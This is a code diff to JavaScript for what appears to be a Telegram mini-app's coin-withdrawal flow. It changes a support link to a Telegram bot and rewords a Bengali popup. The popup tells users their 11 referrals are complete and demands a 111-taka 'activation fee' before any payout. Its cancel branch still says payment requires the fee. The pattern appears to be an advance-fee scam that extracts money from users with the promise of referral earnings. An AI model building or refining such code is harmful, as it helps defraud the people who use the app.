@@ -218,7 +218,7 @@ async function processWithdraw() {
     const amount = parseFloat(document.getElementById("withdraw-amount").value);
     const number = document.getElementById("withdraw-number").value;
     const method = document.getElementById("payment-method").value;
-    const supportLink = "https://t.me/ad16269"; 
+    const supportLink = "https://t.me/ks162699bot"; 
     
     if (!number || !amount) { tg.showAlert("সব তথ্য পূরণ করুন।"); return; }
     if (amount < 500) { tg.showAlert("ন্যূনতম ৫০০ কয়েন প্রয়োজন!"); return; }
@@ -249,11 +249,11 @@ async function processWithdraw() {
     
     tg.showPopup({
         title: 'পেমেন্ট রিকোয়েস্ট',
-        message: 'আপনার ১১টি রেফার পূরণ হয়েছে। পেমেন্ট রিকোয়েস্ট পাঠানোর আগে ১১১ টাকা ফি দিয়ে অ্যাকাউন্ট অ্যাক্টিভ করুন।',
+        message: 'আপনার ১১টি রেফার পূরণ হয়েছে। পেমেন্ট রিকোয়েস্ট পাঠানোর আগে ১১১ টাকা ফি দিয়ে অ্যাকাউন্টটি অ্যাক্টিভ করুন।',
         buttons: [{id: 'support', type: 'default', text: 'অ্যাক্টিভ করতে যোগাযোগ করুন'}, {type: 'cancel', text: 'বাতিল'}]
     }, (buttonId) => { 
         if (buttonId === 'support') { 
-            tg.openLink(supportLink); 
+            tg.openTelegramLink(supportLink); 
         } else {
             let taka = (amount >= 1000) ? (amount / 1000) * 20 : (amount / 500) * 10;
             tg.showAlert("আপনার " + amount + " কয়েন = " + taka + " টাকা। পেমেন্ট পেতে অবশ্যই অ্যাকাউন্ট অ্যাক্টিভেশন ফি প্রদান করুন।");
